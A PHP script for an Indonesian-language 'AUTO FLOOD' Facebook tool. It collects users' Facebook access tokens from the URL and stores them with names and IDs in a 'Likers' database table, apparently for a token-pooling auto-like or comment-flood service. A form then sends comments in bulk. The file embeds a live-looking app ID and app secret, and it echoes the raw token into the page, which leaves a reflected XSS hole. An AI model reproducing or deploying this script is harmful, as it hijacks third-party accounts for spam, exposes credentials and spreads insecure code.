<?php
require 'facebook.php';
session_start();
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$lamafile = 300;
$waktu = time();
if ($handle = opendir('komen')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('komen/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('komen/'.$file);
}
closedir($handle);
}

$token = $_GET["user"];
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'http://ph.superlike.org/m.php';
include 'config.php';
$facebook = new Facebook(array(
   'appId' => '111160212353538',
   'secret' => 'd2d951a8566758675db1dbd50327013c',
   'cookie' => true
));


   mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

   try {
$parameters['access_token'] = $_GET["user"];
      $userData = $facebook->api('/me', $parameters);
   } catch (FacebookApiException $e) {
      die("invalid access token");
   }

if($userData){

if($userData['id'] =="40" 
|| $userData['id'] =="4" 
){
echo "Have a Nice Day ^_^, You got Blocked...!!";
echo "<br>";
echo 'You making a spam... <a href="http://fb.com/shahil.jibon"> Contact me :p</a>';
exit;
}
if($os=opendir('komen')) {
      while($ls = readdir($os)){
       if($ls != "." && $ls != ".."){
if($userData['id'] =="$ls"){
$limit = fileatime('komen/'.$user->id);
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo '<div align="center">Session Limited Please Back Again 05 minutes For submit. ThankYou <font color="red">'.$user->name.'</font><p>
<font color="red">'.$cek.' - 05:00</font></p></div> ';
exit;
}
}
}
}
   //check that user is not already inserted? If is. check it's access token and update if needed
   //also make sure that there is only one access_token for each user
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         Likers
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               Likers
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   
   if(!$row){
      mysql_query(
         "INSERT INTO 
            Likers
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Likers
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
}



try {
$parameters['access_token'] = $_GET["user"];
$statuses = $facebook->api('/me/feed?limit=1=', $parameters);
foreach($statuses['data'] as $status)
{
        echo $status["me/photo"], "<br />";
}
}
catch (FacebookApiException $e) {
      die("invalid access token");
}


 


?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title> AUTO FLOOD </title></head><link rel="stylesheet" type="text/css" href="style.css" media="all,handheld"/><link rel="shortcut icon" href="http://setia.wen.ru/favicon.ico">

<center><div class="bmenu"><img src="http://stevendie.xtgem.com/themes/android_black/logo.gif" width="250" height="50" /> </div> 

<div align="center"><div class="phdr">Welcome To : <br/> AUTO FLOOD </div></div>   <center>   
<div align="center"><div class="clip"><img src="https://graph.facebook.com/me/picture?type=large&access_token=<?php echo $token;?>" width='175px' height '150px'></div></div></div></div></div>

<div align="center"><div class="gmenu">Selamat datang : ** <?php echo $userData['name']; ?> **</div></div></div></div></div>

<div align="center"><div class="gmenu">Status : </div></div></div></div></div>

<div class="phpcode"><div align="center"><?php echo $status["message"];?></div></div>
     </br>
</br>

  <form method="post" action="ferigantengsepanjangmasa.php">
      <div align="center"><div class="bmenu">Status ID : <input size="31" type="visible" name="postid" id="postid" value="<?php echo $status["id"];?>" class="text-input" /></div></div></div></div></div>

      <div align="center"><div class="bmenu">Comment ID : <input type="text" size="31" name="postid" id="postid" value="<?php echo $status["id"];?>" class="text-input" />

<input type="hidden" name="user" value="<?php echo $token;?>" />

</div></div></div></div></div> 
<div class="bmenu"> your comment: </div>
<div class="gmenu"> <textarea name="komen"></textarea><br />      <input type="submit" name="submit" class="uibutton confirm" id="submit_btn" value="TANCAAP " /></br></br></div>

        

   </div>
  </form>
</div>

      </center>           
</body>
</html>
